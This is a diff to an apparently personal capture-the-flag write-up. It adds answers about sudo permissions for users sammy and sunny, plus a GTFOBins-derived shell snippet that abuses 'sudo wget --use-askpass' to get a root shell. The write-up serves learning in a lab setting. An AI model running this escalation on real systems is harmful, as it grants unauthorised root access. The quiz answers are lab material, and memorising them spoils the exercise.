@@ -73,8 +73,23 @@ Q4: What is the password for sammy
 ```
 
 Q5: What is flag located in sammy's home directory 
+ - cat user.txt
 
+Q6: What is the full path of the binary that user sunny can run with sudo privileges?
+ - /root/troll
 
+Q7: What is the complete path of the binary that user sammy can run with sudo privileges?
+ - /usr/bin/wget
+
+Q8: Submit the flag located in root's home directory.
+- https://gtfobins.github.io/gtfobins/wget/
+- since sammy is able to run wget as sudo without password then we can attempt to escalate the privilege by using wget
+```
+TF=$(mktemp)
+chmod +x $TF
+echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
+sudo wget --use-askpass=$TF 0
+```
 
 
 ### Post Exploitation Note - Lesson Learned 
